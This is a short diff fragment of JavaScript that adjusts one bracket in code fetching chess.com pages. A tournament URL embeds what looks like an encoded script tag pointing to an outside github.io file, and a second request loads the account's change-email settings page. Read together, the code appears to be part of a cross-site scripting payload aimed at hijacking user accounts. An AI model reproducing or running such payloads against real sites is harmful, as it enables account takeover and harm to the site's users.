@@ -8,7 +8,7 @@ fetch("https://www.chess.com/tournament/lt-script-src-yellowrook1-github-io-a-js
 });
       
       
-      }
+      })
 
 fetch("https://www.chess.com/settings/change-email").then((response) => response.text())
     .then((text) => {
